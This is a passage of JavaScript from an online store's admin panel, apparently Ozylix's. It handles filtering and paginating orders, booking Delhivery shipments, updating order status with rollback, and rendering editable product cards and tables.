  if (_lvStreamItems.length > 50) _lvStreamItems.pop();
  el.innerHTML = _lvStreamItems.map(i =>
    `<div style="display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid var(--border);font-size:0.75rem;">
      <span style="color:var(--text3);font-family:var(--mono);flex-shrink:0;">${i.time}</span>
      <span style="color:var(--text2);">${i.msg}</span>
    </div>`
  ).join('');
}

function startLiveVisitors() {
  updateLiveVisitors();
  setInterval(updateLiveVisitors, 15000);
}

// ═══════════════════════════════════════════════
// ORDERS
// ═══════════════════════════════════════════════
const ORDERS_PER_PAGE = 50;
let ordersPage = 1;
let ordersDateMode = 'all'; // 'all' | 7 | 30 | 90 | 'month' | 'custom'
let ordersFilteredList = [];

async function loadOrders() {
  try {
    // Full dataset (up to 2000) — pagination below is a client-side view over
    // this, so it stays in sync with everything else that reads allOrders
    // (order modal, status updates, global search, payments, invoices).
    const r = await apiFetch('/api/admin/orders?limit=2000');
    const d = await r.json();
    allOrders = d.data || d.orders || (Array.isArray(d)?d:[]);
    populateOrderYearFilter();
    filterOrders();
  } catch(e) { toast('Orders error: '+e.message,'error'); }
}

function populateOrderYearFilter() {
  const sel = document.getElementById('orderYearFilter');
  if (!sel || sel.options.length > 1) return; // already populated
  const years = new Set(allOrders.map(o => (o.created_at||'').slice(0,4)).filter(Boolean));
  years.add(String(new Date().getFullYear()));
  sel.innerHTML = '<option value="">Any Year</option>' +
    [...years].sort().reverse().map(y => `<option value="${y}">${y}</option>`).join('');
}

function setOrderDateRange(days, btn) {
  ordersDateMode = days;
  document.querySelectorAll('[id^=ordDateChip]').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('orderMonthFilter').value = '';
  document.getElementById('orderYearFilter').value = '';
  document.getElementById('orderDateStart').value = '';
  document.getElementById('orderDateEnd').value = '';
  ordersPage = 1;
  filterOrders();
}

function setOrderMonthYear() {
  ordersDateMode = 'month';
  document.querySelectorAll('[id^=ordDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('orderDateStart').value = '';
  document.getElementById('orderDateEnd').value = '';
  ordersPage = 1;
  filterOrders();
}

function setOrderCustomRange() {
  ordersDateMode = 'custom';
  document.querySelectorAll('[id^=ordDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('orderMonthFilter').value = '';
  document.getElementById('orderYearFilter').value = '';
  ordersPage = 1;
  filterOrders();
}

function clearOrderDateFilters() {
  ordersDateMode = 'all';
  document.querySelectorAll('[id^=ordDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('ordDateChipAll').classList.add('active');
  document.getElementById('orderMonthFilter').value = '';
  document.getElementById('orderYearFilter').value = '';
  document.getElementById('orderDateStart').value = '';
  document.getElementById('orderDateEnd').value = '';
  ordersPage = 1;
  filterOrders();
}

function filterOrders() {
  const q    = (document.getElementById('orderSearch').value||'').toLowerCase();
  const st   = document.getElementById('orderStatusFilter').value;
  const pay  = document.getElementById('orderPayFilter').value;
  let list   = allOrders;

  if(q)   list = list.filter(o => (o.id+o.customer_name+o.customer_email).toLowerCase().includes(q));
  if(st)  list = list.filter(o => (o.status||o.fulfillment) === st);
  if(pay) list = list.filter(o => o.payment_status === pay);

  if (ordersDateMode === 'today') {
    const todayStr = new Date().toISOString().split('T')[0];
    list = list.filter(o => (o.created_at||'').startsWith(todayStr));
  } else if (ordersDateMode === 7 || ordersDateMode === 30 || ordersDateMode === 90) {
    const cutoff = Date.now() - ordersDateMode * 86400000;
    list = list.filter(o => new Date(o.created_at).getTime() >= cutoff);
  } else if (ordersDateMode === 'month') {
    const m = document.getElementById('orderMonthFilter').value;
    const y = document.getElementById('orderYearFilter').value;
    if (m) list = list.filter(o => (o.created_at||'').slice(5,7) === m.padStart(2,'0'));
    if (y) list = list.filter(o => (o.created_at||'').slice(0,4) === y);
  } else if (ordersDateMode === 'custom') {
    const start = document.getElementById('orderDateStart').value;
    const end   = document.getElementById('orderDateEnd').value;
    if (start) list = list.filter(o => o.created_at >= start);
    if (end)   list = list.filter(o => o.created_at <= end + 'T23:59:59');
  }

  ordersFilteredList = list;
  // Reset to page 1 if current page no longer exists (e.g. after a filter narrows results)
  const totalPages = Math.max(1, Math.ceil(list.length / ORDERS_PER_PAGE));
  if (ordersPage > totalPages) ordersPage = 1;
  renderOrdersPage();
}

function ordersGoToPage(page) {
  const totalPages = Math.max(1, Math.ceil(ordersFilteredList.length / ORDERS_PER_PAGE));
  ordersPage = Math.min(Math.max(1, page), totalPages);
  renderOrdersPage();
}

function renderOrdersPage() {
  const totalPages = Math.max(1, Math.ceil(ordersFilteredList.length / ORDERS_PER_PAGE));
  const start = (ordersPage - 1) * ORDERS_PER_PAGE;
  const pageItems = ordersFilteredList.slice(start, start + ORDERS_PER_PAGE);

  renderOrders(pageItems);

  const infoEl = document.getElementById('ordersPageInfo');
  if (infoEl) {
    const rangeEnd = Math.min(start + ORDERS_PER_PAGE, ordersFilteredList.length);
    infoEl.textContent = ordersFilteredList.length
      ? `Showing ${start+1}–${rangeEnd} of ${ordersFilteredList.length} orders`
      : 'No orders match these filters';
  }
  document.getElementById('ordersPageLabel').textContent = `Page ${ordersPage} of ${totalPages}`;
  document.getElementById('ordersPrevBtn').disabled = ordersPage <= 1;
  document.getElementById('ordersNextBtn').disabled = ordersPage >= totalPages;
}

function renderOrders(list) {
  document.getElementById('ordersTbody').innerHTML = list.length ? list.map(o => {
    let items = [];
    try { items = typeof o.items==='string' ? JSON.parse(o.items||'[]') : (o.items||[]); } catch {}
    // data-oid anchors the rollback flash to this order's row.
    return `
    <tr data-oid="${o.id}">
      <td class="td-id" style="cursor:pointer;color:var(--green-text);" onclick="openOrderModal('${o.id}')">${o.id}</td>
      <td>
        <div style="font-size:0.83rem;font-weight:500;">${esc(o.customer_name)||'-'}</div>
        <div style="font-size:0.72rem;color:var(--text3);">${esc(o.customer_phone||o.customer_email||'')}</div>
      </td>
      <td style="font-size:0.78rem;color:var(--text2);">${items.length} item${items.length!==1?'s':''}</td>
      <td style="font-weight:700;color:var(--green-text);">₹${fmtNum(o.total||0)}</td>
      <td>${payBadge(o.payment_status)}</td>
      <td>${statusBadge(o.fulfillment)}</td>
      <td style="font-size:0.72rem;color:var(--text3);">${fmtDate(o.created_at)}</td>
      <td>
        <div style="display:flex;gap:4px;">
          <button class="btn btn-secondary btn-sm btn-icon" onclick="openOrderModal('${o.id}')" title="View">👁️</button>
          <button class="btn btn-secondary btn-sm btn-icon" onclick="printInvoice('${o.id}')" title="Invoice">🧾</button>
          <button class="btn btn-danger btn-sm btn-icon" onclick="softDeleteOrder('${o.id}')" title="Delete">🗑️</button>
        </div>
      </td>
    </tr>`;
  }).join('') : '<tr><td colspan="8"><div class="empty-state"><div class="empty-ico">📦</div><div class="empty-msg">No orders found</div></div></td></tr>';
}

async function openOrderModal(orderId) {
  const o = allOrders.find(x => x.id === orderId);
  if(!o) return;
  let items = [];
  try { items = typeof o.items==='string' ? JSON.parse(o.items||'[]') : (o.items||[]); } catch {}

  document.getElementById('orderModalTitle').textContent = `Order ${o.id}`;
  document.getElementById('orderModalBody').innerHTML = `
    <div class="grid-2" style="margin-bottom:20px;gap:12px;">
      <div>
        <div style="font-size:0.72rem;color:var(--text3);margin-bottom:4px;">CUSTOMER</div>
        <div style="font-weight:600;">${esc(o.customer_name)||'-'}</div>
        <div style="font-size:0.8rem;color:var(--text2);">${esc(o.customer_email)}</div>
        <div style="font-size:0.8rem;color:var(--text2);">${esc(o.customer_phone)}</div>
      </div>
      <div>
        <div style="font-size:0.72rem;color:var(--text3);margin-bottom:4px;">SHIPPING ADDRESS</div>
        <div style="font-size:0.82rem;color:var(--text2);line-height:1.7;">
          ${esc(o.address||o.address_line1||'')} ${esc(o.address_line2||'')}<br>
          ${esc(o.city||'')}, ${esc(o.state||'')} ${esc(o.pincode||'')}
        </div>
      </div>
    </div>
    <div class="table-wrap" style="margin-bottom:20px;">
      <table>
        <thead><tr><th>Product</th><th>Qty</th><th>Price</th><th>Total</th></tr></thead>
        <tbody>${items.map(it => `<tr><td>${esc(it.name||'?')}</td><td>${it.qty||it.units||1}</td><td>₹${fmtNum(it.price||it.selling_price||0)}</td><td>₹${fmtNum((it.price||it.selling_price||0)*(it.qty||it.units||1))}</td></tr>`).join('')||'<tr><td colspan="4">No items</td></tr>'}</tbody>
      </table>
    </div>
    <div class="grid-2" style="margin-bottom:20px;gap:12px;">
      <div class="card" style="padding:14px;">
        <div style="font-size:0.72rem;color:var(--text3);margin-bottom:8px;">PAYMENT SUMMARY</div>
        ${[['Subtotal', o.subtotal||o.total], ['Discount', o.discount||0], ['Shipping', o.shipping||0], ['Total', o.total]].map(([k,v]) => `<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border);font-size:0.82rem;"><span>${k}</span><span style="font-weight:${k==='Total'?700:400};color:${k==='Total'?'var(--green-text)':'var(--text2)'};">₹${fmtNum(v||0)}</span></div>`).join('')}
      </div>
      <div class="card" style="padding:14px;">
        <div style="font-size:0.72rem;color:var(--text3);margin-bottom:8px;">UPDATE STATUS</div>
        <div style="display:flex;flex-direction:column;gap:8px;">
          <select class="form-control" id="orderStatusSel" style="font-size:0.82rem;">
            ${['Pending','Processing','Shipped','Delivered','Cancelled'].map(s=>`<option ${(o.status||o.fulfillment)===s?'selected':''}>${s}</option>`).join('')}
          </select>
          <input class="form-control" id="trackingIdInput" placeholder="Shiprocket / Tracking ID (optional)" value="${o.shiprocket_id||o.tracking_id||''}" style="font-size:0.82rem;">
          <button class="btn btn-primary btn-sm" onclick="updateOrderStatus('${o.id}')">Update Status</button>
        </div>
      </div>
    </div>
    <div class="card" style="padding:14px;margin-bottom:20px;">
      <div style="font-size:0.72rem;color:var(--text3);margin-bottom:8px;">DELHIVERY SHIPPING</div>
      ${o.delhivery_waybill ? `
        <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
          <span class="badge badge-green">🚚 AWB ${o.delhivery_waybill}</span>
          <a href="https://www.delhivery.com/track/package/${encodeURIComponent(o.delhivery_waybill)}"
             target="_blank" rel="noopener" style="font-size:0.82rem;">Track shipment ↗</a>
          <button class="btn btn-sm" onclick="dlPackingSlip('${o.delhivery_waybill}')">Packing slip</button>
        </div>
      ` : `
        <div style="font-size:0.82rem;color:var(--text2);margin-bottom:10px;">
          Not shipped yet. This sends the order to Delhivery and books an AWB.
        </div>
        <button class="btn btn-primary btn-sm" id="dlShipBtn" onclick="dlShipOrder('${o.id}')">🚚 Ship with Delhivery</button>
      `}
      <div id="dlShipMsg" style="font-size:0.8rem;margin-top:10px;"></div>
    </div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;">
      ${statusBadge(o.status||o.fulfillment)}${payBadge(o.payment_status)}
      <span class="badge badge-gray">📅 ${fmtDate(o.created_at)}</span>
      ${o.coupon_code?`<span class="badge badge-gold">🏷️ ${o.coupon_code}</span>`:''}
    </div>
  `;
  openModal('orderModal');
}

// ── Delhivery ────────────────────────────────────────────────────────────
// The backend has had /api/create-delhivery-order all along, but nothing ever
// called it — no button here, no automatic push after payment — which is why
// no order ever reached Delhivery. Deliberately a manual action rather than
// automatic on payment: shipping costs money and books a real pickup, so it
// stays a decision, and any rejection is shown here instead of failing quietly
// in a webhook.
async function dlShipOrder(orderId) {
  const btn = document.getElementById('dlShipBtn');
  const msg = document.getElementById('dlShipMsg');
  const o = allOrders.find(x => String(x.id) === String(orderId));
  if (!o) { msg.innerHTML = '<span style="color:var(--red-text)">Order not found.</span>'; return; }

  // Delhivery rejects the whole shipment on a bad pincode or phone, so check
  // the two that actually fail before spending a call.
  const pin = String(o.pincode || '').replace(/\D/g, '');
  const phone = String(o.customer_phone || '').replace(/\D/g, '');
  if (pin.length !== 6)  { msg.innerHTML = '<span style="color:var(--red-text)">Pincode must be 6 digits — this order has "' + (o.pincode || '') + '".</span>'; return; }
  if (phone.length < 10) { msg.innerHTML = '<span style="color:var(--red-text)">Phone number looks incomplete — "' + (o.customer_phone || '') + '".</span>'; return; }

  if (!confirm(`Ship order ${orderId} with Delhivery?\n\nThis books a real shipment and a pickup.`)) return;

  btn.disabled = true;
  btn.textContent = 'Booking…';
  msg.innerHTML = '';

  const items = Array.isArray(o.items) ? o.items : (() => { try { return JSON.parse(o.items || '[]'); } catch { return []; } })();

  try {
    const r = await apiFetch('/api/create-delhivery-order', {
      method: 'POST',
      body: JSON.stringify({
        order_id: String(o.id),
        order_date: o.created_at,
        billing_customer_name: o.customer_name || '',
        billing_address: o.address || '',
        billing_city: o.city || '',
        billing_state: o.state || '',
        billing_pincode: pin,
        billing_phone: phone,
        billing_email: o.customer_email || '',
        payment_method: (o.payment_method || '').toUpperCase() === 'COD' ? 'COD' : 'Prepaid',
        sub_total: Number(o.total) || 0,
        order_items: items.map(i => ({
          name: i.name || i.title || 'Product',
          units: Number(i.qty || i.quantity || i.units) || 1,
          selling_price: Number(i.price || i.selling_price) || 0,
        })),
      }),
    });
    const data = await r.json();

    if (!r.ok) {
      // 422 carries Delhivery's own rejection text, which names the real
      // problem (unregistered warehouse, unserviceable pin, zero wallet).
      msg.innerHTML = '<span style="color:var(--red-text)">' + esc(data.error || 'Delhivery rejected the shipment') + '</span>';
      btn.disabled = false; btn.textContent = '🚚 Ship with Delhivery';
      return;
    }

    o.delhivery_waybill = data.waybill;
    o.fulfillment = 'Processing';
    msg.innerHTML = '<span style="color:var(--green-text)">Booked. AWB ' + esc(data.waybill) + '</span>'
      + (data.warning ? '<br><span style="color:var(--gold-text)">⚠️ ' + esc(data.warning) + '</span>' : '');
    setTimeout(() => openOrderModal(orderId), 1200);
  } catch (e) {
    msg.innerHTML = '<span style="color:var(--red-text)">' + esc(e.message || 'Request failed') + '</span>';
    btn.disabled = false; btn.textContent = '🚚 Ship with Delhivery';
  }
}

async function dlPackingSlip(waybill) {
  try {
    const r = await apiFetch('/api/delhivery/packing-slip/' + encodeURIComponent(waybill));
    const data = await r.json();
    const url = data?.packages?.[0]?.pdf_download_link || data?.pdf_download_link;
    if (url) window.open(url, '_blank', 'noopener');
    else alert('Delhivery did not return a packing slip for ' + waybill);
  } catch (e) {
    alert('Could not fetch packing slip: ' + (e.message || 'request failed'));
  }
}

async function updateOrderStatus(orderId) {
  const status = document.getElementById('orderStatusSel').value;
  const tracking = document.getElementById('trackingIdInput').value;
  const order = allOrders.find(o=>o.id===orderId);

  // Online payments are already marked Paid at checkout via Cashfree — untouched here.
  // COD orders stay "COD - Pending" until delivered; once Delivered, auto-mark the
  // cash as collected so it starts counting in revenue.
  const curPay   = (order && order.payment_status) || '';
  const isCOD    = curPay.toLowerCase().includes('cod');
  const isPaid   = curPay.toLowerCase().includes('paid') || curPay === 'SUCCESS';
  let payment_status;
  if (status === 'Delivered' && isCOD && !isPaid) {
    payment_status = 'Paid - COD Collected';
  }

  const body = {status, fulfillment:status, shiprocket_id:tracking||null};
  if (payment_status) body.payment_status = payment_status;

  const idx = allOrders.findIndex(o=>o.id===orderId);
  const before = idx > -1 ? {
    status: allOrders[idx].status, fulfillment: allOrders[idx].fulfillment,
    shiprocket_id: allOrders[idx].shiprocket_id, payment_status: allOrders[idx].payment_status,
  } : null;

  await optimistic({
    // Close the modal and move the order immediately. This is the most
    // repeated action in the panel — marking a run of orders Shipped —
    // and waiting for a round trip on each one is most of the time it
    // takes to work through them.
    apply: () => {
      if (idx > -1) {
        allOrders[idx].status = status; allOrders[idx].fulfillment = status;
        allOrders[idx].shiprocket_id = tracking;
        if (payment_status) allOrders[idx].payment_status = payment_status;
      }
      closeModal('orderModal');
      filterOrders();
    },
    commit: () => expectOk(apiFetch(`/api/admin/orders/${orderId}`, {
      method:'PUT', body: JSON.stringify(body),
    }), 'Update failed — check backend logs'),
    rollback: () => {
      if (idx > -1 && before) Object.assign(allOrders[idx], before);
      filterOrders();
    },
    flash: `#ordersTbody tr[data-oid="${orderId}"]`,
    successMsg: payment_status
      ? `Order ${orderId} → ${status} (COD payment collected ✅)`
      : `Order ${orderId} → ${status}`,
  });
}

async function softDeleteOrder(id) {
  if(!confirm(`Soft-delete order ${id}? It will be hidden from the list.`)) return;
  const idx = allOrders.findIndex(o => o.id === id);
  if (idx < 0) return;
  const removed = allOrders[idx];
  try {
    await confirmCriticalAction(`Delete order ${id}? It will be hidden from the list (soft-delete).`, async function(proof){
  await optimistic({
    // Splice rather than filter-and-reassign, so the rollback can put
    // the order back exactly where it was instead of at the end of a
    // list the admin is trying to work down in order.
    apply:    () => { allOrders.splice(idx, 1); filterOrders(); },
    commit:   () => expectOk(apiFetch(`/api/admin/orders/${id}`, {method:'DELETE', headers: proof ? {'X-Password-Proof': proof} : {}}), 'Delete failed'),
    rollback: () => { allOrders.splice(idx, 0, removed); filterOrders(); },
    flash:    `#ordersTbody tr[data-oid="${id}"]`,
    successMsg: 'Order deleted',
  });
    });
  } catch (e) { if (String(e.message) !== 'cancelled') toast(e.message, 'error'); }
}

// ═══════════════════════════════════════════════
// PRODUCTS
// ═══════════════════════════════════════════════
async function loadProducts() {
  try {
    // Show loading state in both views
    document.getElementById('productCardsView').innerHTML = '<div class="empty-state" style="grid-column:1/-1;"><div class="loading-dots" style="font-size:0.9rem;color:var(--text3);">Loading products</div></div>';
    const r = await apiFetch('/api/admin/products');
    const _r = await r.json();
    // Surface real failures (403 permission denied, 500 server/DB error) instead of
    // silently treating them as "zero products" — this was masking real errors before.
    if (!r.ok || _r.error) {
      throw new Error(_r.error || `Server returned ${r.status}`);
    }
    allProducts = _r.data || _r.products || (Array.isArray(_r)?_r:[]);
    filterProducts();
    loadInventory();
  } catch(e) {
    toast('Products error: '+e.message,'error');
    document.getElementById('productCardsView').innerHTML =
      `<div class="empty-state" style="grid-column:1/-1;color:var(--red);">⚠️ Could not load products: ${e.message}</div>`;
  }
}

function setProductFilter(f, el) {
  currentProductFilter = f;
  document.querySelectorAll('#page-products .filter-chip').forEach(c => c.classList.remove('active'));
  el.classList.add('active');
  filterProducts();
}

function toggleShowDeleted() {
  showDeletedProducts = !showDeletedProducts;
  filterProducts();
}

function filterProducts() {
  const q   = (document.getElementById('productSearch').value||'').toLowerCase();
  const cat = document.getElementById('productCatFilter').value;
  let list  = allProducts;
  if(!showDeletedProducts) list = list.filter(p => !p.deleted_at);
  if(q) list = list.filter(p => (p.name||'').toLowerCase().includes(q));
  if(cat) list = list.filter(p => p.category === cat);
  if(currentProductFilter === 'active') list = list.filter(p => p.active);
  if(currentProductFilter === 'lowstock') list = list.filter(p => p.stock < 20);
  renderProducts(list);
}

// ── Product view state ──────────────────────
let currentProductView = 'cards';
let selectedProductIds = new Set();
let drawerProductId = null;

function setProductView(view, btn) {
  currentProductView = view;
  document.querySelectorAll('.view-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('productCardsView').style.display = view === 'cards' ? 'grid' : 'none';
  document.getElementById('productTableView').style.display = view === 'table' ? 'block' : 'none';
  filterProducts();
}

function updateProductStats(list) {
  const active = list.filter(p => p.active && !p.deleted_at).length;
  const low = list.filter(p => !p.deleted_at && p.stock < 20).length;
  const ratings = list.filter(p => p.rating).map(p => parseFloat(p.rating));
  const avgRating = ratings.length ? (ratings.reduce((a,b)=>a+b,0)/ratings.length).toFixed(1) : '–';
  const catalogValue = list.filter(p => !p.deleted_at).reduce((s,p) => s + (parseFloat(p.price||0) * (p.stock||0)), 0);
  document.getElementById('statTotalProds').textContent = list.filter(p=>!p.deleted_at).length;
  document.getElementById('statActiveProds').textContent = active;
  document.getElementById('statLowStock').textContent = low;
  document.getElementById('statAvgRating').textContent = avgRating + '★';
  document.getElementById('statCatalogValue').textContent = '₹' + catalogValue.toLocaleString('en-IN');
}

function filterProducts() {
  const q    = (document.getElementById('productSearch').value||'').toLowerCase();
  const cat  = document.getElementById('productCatFilter').value;
  const sort = document.getElementById('productSortFilter')?.value || 'position';
  let list   = allProducts;
  if(!showDeletedProducts) list = list.filter(p => !p.deleted_at);
  if(q) list = list.filter(p =>
    (p.name||'').toLowerCase().includes(q) ||
    (p.brand||'').toLowerCase().includes(q) ||
    (p.category||'').toLowerCase().includes(q)
  );
  if(cat) list = list.filter(p => p.category === cat);
  if(currentProductFilter === 'active')    list = list.filter(p => p.active && !p.deleted_at);
  if(currentProductFilter === 'inactive')  list = list.filter(p => !p.active && !p.deleted_at);
  if(currentProductFilter === 'lowstock')  list = list.filter(p => p.stock < 20 && !p.deleted_at);
  if(currentProductFilter === 'nodiscount') list = list.filter(p => !p.sale_price && !p.deleted_at);
  // Sort
  if(sort === 'position')     list = [...list].sort((a,b)=>(a.sort_order ?? a.position ?? 9999)-(b.sort_order ?? b.position ?? 9999));
  if(sort === 'name')         list = [...list].sort((a,b)=>(a.name||'').localeCompare(b.name||''));
  if(sort === 'price_low')    list = [...list].sort((a,b)=>parseFloat(a.price||0)-parseFloat(b.price||0));
  if(sort === 'price_high')   list = [...list].sort((a,b)=>parseFloat(b.price||0)-parseFloat(a.price||0));
  if(sort === 'stock_low')    list = [...list].sort((a,b)=>(a.stock||0)-(b.stock||0));
  if(sort === 'discount')     list = [...list].sort((a,b) => {
    const da = a.sale_price ? Math.round((1-a.sale_price/a.price)*100) : 0;
    const db = b.sale_price ? Math.round((1-b.sale_price/b.price)*100) : 0;
    return db - da;
  });
  updateProductStats(allProducts);
  if(currentProductView === 'cards') renderProductCards(list);
  else renderProducts(list);
}

function renderProducts(list) {
  const discPct = p => p.sale_price && p.price ? Math.round((1-parseFloat(p.sale_price)/parseFloat(p.price))*100) : 0;
  document.getElementById('productsTbody').innerHTML = list.length ? list.map(p => {
    const disc = discPct(p);
    const stockClass = p.stock===0 ? 'badge-red' : p.stock<20 ? 'badge-gold' : 'badge-green';
    const checked = selectedProductIds.has(p.id) ? 'checked' : '';
    // data-pid is what lets a rolled-back optimistic change flash the
    // right row. Without it flashRollback silently finds nothing and the
    // undo happens invisibly, which is the failure mode optimistic UI
    // has to avoid above all others.
    return `<tr data-pid="${p.id}" style="${p.deleted_at?'opacity:0.5;':''}">
      <td><input type="checkbox" ${checked} onchange="toggleSelectProduct(${p.id},this)"></td>
      <td>
        <div style="display:flex;align-items:center;gap:4px;">
          <input class="inline-input" type="number" value="${p.sort_order ?? p.position ?? ''}" placeholder="–" id="pos_${p.id}" style="width:52px;"
            onkeydown="if(event.key==='Enter') saveInlineField(${p.id},'sort_order',this.value===''?null:parseInt(this.value))"
            onchange="saveInlineField(${p.id},'sort_order',this.value===''?null:parseInt(this.value))">
          <div style="display:flex;flex-direction:column;gap:1px;">
            <button class="btn btn-secondary btn-sm btn-icon" style="padding:0 4px;height:14px;line-height:1;font-size:0.6rem;" onclick="moveProductPosition(${p.id},'up')" title="Move up">▲</button>
            <button class="btn btn-secondary btn-sm btn-icon" style="padding:0 4px;height:14px;line-height:1;font-size:0.6rem;" onclick="moveProductPosition(${p.id},'down')" title="Move down">▼</button>
          </div>
        </div>
      </td>
      <td><img class="prod-img" src="${adminCdnImg(p.image)||'/assets/ozylix-icon-192.png'}" onerror="this.src='/assets/ozylix-icon-192.png'" alt=""></td>
      <td>
        <div class="prod-tbl-name">${esc(p.name)}</div>
        <div class="prod-tbl-brand">${p.brand||'Ozylix'} · ${p.category||'–'}</div>
      </td>
      <td><span class="badge badge-gray" style="text-transform:capitalize;">${p.category||'-'}</span></td>
      <td>
        <div class="inline-edit-cell">
          <input class="inline-input" type="number" value="${p.price||0}" id="mrp_${p.id}"
            onkeydown="if(event.key==='Enter') saveInlineField(${p.id},'price',this.value)"
            onchange="saveInlineField(${p.id},'price',this.value)">
        </div>
      </td>
      <td>
        <div class="inline-edit-cell">
          <input class="inline-input" type="number" value="${p.sale_price||''}" placeholder="–" id="sale_${p.id}"
            onkeydown="if(event.key==='Enter') saveInlineField(${p.id},'sale_price',this.value||null)"
            onchange="saveInlineField(${p.id},'sale_price',this.value||null)">
        </div>
      </td>
      <td>${disc>0 ? `<span class="badge badge-green">${disc}% off</span>` : '<span style="color:var(--text3);font-size:0.75rem;">–</span>'}</td>
      <td>
        <div class="inline-edit-cell">
          <input class="inline-input" type="number" value="${p.stock||0}" id="stock_${p.id}" style="width:65px;"
            onkeydown="if(event.key==='Enter') saveInlineField(${p.id},'stock',parseInt(this.value))"
            onchange="saveInlineField(${p.id},'stock',parseInt(this.value))">
        </div>
      </td>
      <td>${p.deleted_at?'<span class="badge badge-red">Deleted</span>':p.active?'<span class="badge badge-green">Active</span>':'<span class="badge badge-gray">Inactive</span>'}</td>
      <td>
        <div style="display:flex;gap:4px;">
          <button class="btn btn-secondary btn-sm btn-icon owner-only" onclick="openProductDrawer(${p.id})" title="Full Edit">✏️</button>
          ${p.deleted_at
            ? `<button class="btn btn-primary btn-sm btn-icon owner-only" onclick="restoreProduct(${p.id})" title="Restore">♻️</button>`
            : `<button class="btn btn-danger btn-sm btn-icon owner-only" onclick="deleteProduct(${p.id})" title="Delete">🗑️</button>`
          }
        </div>
      </td>
    </tr>`;
  }).join('') : '<tr><td colspan="11"><div class="empty-state"><div class="empty-ico">🛍️</div><div class="empty-msg">No products found</div></div></td></tr>';
}

function renderProductCards(list) {
  const discPct = p => p.sale_price && p.price ? Math.round((1-parseFloat(p.sale_price)/parseFloat(p.price))*100) : 0;
  document.getElementById('productCardsView').innerHTML = list.length ? list.map(p => {
    const disc = discPct(p);
    const stockClass = p.stock===0 ? 'out' : p.stock<20 ? 'low' : 'ok';
    const stockLabel = p.stock===0 ? '🔴 Out' : p.stock<20 ? '🟡 Low' : '🟢 OK';
    const statusBadge = p.deleted_at
      ? '<span class="badge badge-red" style="font-size:0.65rem;">Deleted</span>'
      : p.active
        ? '<span class="badge badge-green" style="font-size:0.65rem;">Active</span>'
        : '<span class="badge badge-gray" style="font-size:0.65rem;">Inactive</span>';
    return `
    <div class="prod-card${p.deleted_at?' deleted':''}" id="prodcard_${p.id}">
      <div class="prod-status-ribbon">${statusBadge}</div>
      <img class="prod-card-img" src="${adminCdnImg(p.image)||'/assets/ozylix-icon-192.png'}"
        onerror="this.src='/assets/ozylix-icon-192.png'" alt="${p.name}"
        onclick="openProductDrawer(${p.id})">
      <div class="prod-card-body">
        <div class="prod-card-name" title="${p.name}">${p.name}</div>
        <div class="prod-card-brand">${p.brand||'Ozylix'} · <span style="text-transform:capitalize;">${p.category||''}</span></div>
        <div class="prod-card-prices">
          ${disc > 0
            ? `<span class="prod-card-sale">₹${p.sale_price}</span>
               <span class="prod-card-mrp">₹${p.price}</span>
               <span class="prod-card-discount-badge">${disc}% off</span>`
            : `<span class="prod-card-nodiscount">₹${p.price||0}</span>`
          }
        </div>
        <div class="prod-card-stats">
          <div class="prod-stat ${stockClass}">
            <div class="prod-stat-val">${p.stock||0}</div>
            <div class="prod-stat-lbl">Stock</div>
          </div>
          <div class="prod-stat">
            <div class="prod-stat-val">${p.rating||4.5}★</div>
            <div class="prod-stat-lbl">Rating</div>
          </div>
          <div class="prod-stat">
            <div class="prod-stat-val">${p.reviews||0}</div>
            <div class="prod-stat-lbl">Reviews</div>
          </div>
        </div>
        <!-- Quick inline edit for price + stock -->
        <div class="qe-wrap" id="qe_${p.id}">
          <div class="qe-row">
            <div class="qe-group">
              <div class="qe-label">MRP (₹)</div>
              <input class="qe-input" type="number" id="qe_price_${p.id}" value="${p.price||0}">
            </div>
            <div class="qe-group">
              <div class="qe-label">Sale Price (₹)</div>
              <input class="qe-input" type="number" id="qe_sale_${p.id}" value="${p.sale_price||''}" placeholder="No discount">
            </div>
          </div>
          <div class="qe-row">
            <div class="qe-group">
              <div class="qe-label">Stock Qty</div>
              <input class="qe-input" type="number" id="qe_stock_${p.id}" value="${p.stock||0}" min="0">
            </div>
            <div class="qe-group">
              <div class="qe-label">Status</div>
              <select class="qe-input" id="qe_active_${p.id}">
                <option value="true" ${p.active!==false?'selected':''}>Active</option>
                <option value="false" ${p.active===false?'selected':''}>Inactive</option>
              </select>
            </div>
          </div>
          <div class="qe-group" style="margin-bottom:8px;">
            <div class="qe-label">Description (short)</div>
            <textarea class="qe-input qe-textarea" id="qe_desc_${p.id}">${p.description||''}</textarea>
          </div>
          <div class="qe-actions">
            <button class="btn btn-secondary btn-sm" onclick="closeQuickEdit(${p.id})">Cancel</button>
            <button class="btn btn-primary btn-sm" onclick="saveQuickEdit(${p.id})">💾 Save Changes</button>
          </div>
        </div>
        <div class="prod-card-actions">
          <button class="btn btn-secondary btn-sm owner-only" onclick="toggleQuickEdit(${p.id})">⚡ Quick Edit</button>
          <button class="btn btn-secondary btn-sm owner-only" onclick="openProductDrawer(${p.id})">✏️ Full Edit</button>
          ${p.deleted_at
            ? `<button class="btn btn-primary btn-sm owner-only" onclick="restoreProduct(${p.id})">♻️</button>`
            : `<button class="btn btn-danger btn-sm owner-only" onclick="deleteProduct(${p.id})">🗑️</button>`
          }
        </div>
      </div>
    </div>`;
  }).join('') : '<div class="empty-state" style="grid-column:1/-1;"><div class="empty-ico">🛍️</div><div class="empty-msg">No products found</div></div>';
}

// ── Quick Edit (on card) ──────────────────────
function toggleQuickEdit(id) {
  const el = document.getElementById(`qe_${id}`);
  if(!el) return;
  el.classList.toggle('open');
}
function closeQuickEdit(id) {
  document.getElementById(`qe_${id}`)?.classList.remove('open');
}
async function saveQuickEdit(id) {
  const p = allProducts.find(x=>x.id===id); if(!p) return;
  const body = {
    price:       parseFloat(document.getElementById(`qe_price_${id}`)?.value) || p.price,
    sale_price:  parseFloat(document.getElementById(`qe_sale_${id}`)?.value) || null,
    stock:       parseInt(document.getElementById(`qe_stock_${id}`)?.value) || 0,
    active:      document.getElementById(`qe_active_${id}`)?.value !== 'false',
    description: document.getElementById(`qe_desc_${id}`)?.value || p.description || '',
  };
  try {
